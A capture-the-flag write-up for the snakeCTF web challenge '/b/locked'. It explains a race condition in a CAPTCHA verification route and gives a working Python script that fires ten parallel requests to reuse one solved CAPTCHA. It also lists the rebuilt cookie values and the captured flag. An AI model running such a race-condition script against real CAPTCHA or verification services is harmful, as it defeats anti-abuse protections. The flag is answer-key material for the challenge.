# /b/locked

![image](https://github.com/user-attachments/assets/d1a8cfbf-7735-47b6-818b-4054ecc8f340)

**Attachment:** [blocked.zip](https://github.com/user-attachments/files/22099805/blocked.zip)

## Writeup

![image](https://github.com/user-attachments/assets/c325e1cc-9171-4e7e-b808-d07c49ad0dba)

Looking at the site, we need to solve 10 CAPTCHAs in 10 seconds. Sounds impossible, right?

We have the code, and after digging through it, we found in `index.js` that in the `/api/solve` route, the CAPTCHA is **deleted** from the **database** after **successful verification**:

```javascript
await new Promise((resolve, reject) => {
            db.run("DELETE FROM captchas WHERE id = ?", [captchaId], (err) => {
                if (err) reject(err);
                else resolve();
            });
        });
```

This is a **Race Condition** vulnerability in **CAPTCHA Deletion**! We exploited it using this simple script:

```python
import requests
import threading

captcha = input("captchaId: ")
sol = input("solution: ")


def send_request(captcha, sol):
    url = "https://3968a9e336c5d29b33a67f262221bd0e.blocked.challs.snakectf.org/api/solve"
    data = {
        "captchaId": captcha,
        "solution": sol
    }
    response = requests.post(url, json=data)
    print("-" * 20)
    print(response.text)
    print(response.cookies)
    print("-" * 20)


threads = []
for _ in range(10):
    t = threading.Thread(target=send_request, args=(captcha, sol))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

The **CAPTCHA ID** is obtained from the `/api/captcha` endpoint:

![image](https://github.com/user-attachments/assets/b93838db-5ab1-458b-b2b5-791b182a5ef6)

The **CAPTCHA solution** is obtained directly from the image.

Running the script:

![image](https://github.com/user-attachments/assets/84870151-4619-48a3-a4d7-e40db6dc5cce)

Once we have solved **10 CAPTCHAs** correctly, we need to reconstruct the **cookie** from scratch and send it to the `/protected` endpoint:

![image](https://github.com/user-attachments/assets/4e57e5cd-1686-48b3-9e64-a86dbfd35ed8)

```
["5ef873d914d8f11cb551ad4b9d421b7d","9bb39f3004230756c6a0bfe7073cf88d","d143e68ff513f37063caee51187fc6bc","091ec543d1a7a8a9cc849e6c143832e9","545a2bf43b8d04e10894cc8b0e4bb759","a9ad6a23af859edfde1705bcca778805","a138283c03df3656e55491057711f304","6b68be2bebc4a2f87b20dd7795f65ba9","a98ce633b03bf1ef417a9a31a12c4d61","b1ab7e537ada91610fd177b08ee1cab9"]
```

Flag: **snakeCTF{4n0n_byp4553d_th3_f1lt3r_d41e5ede63c7c598}**
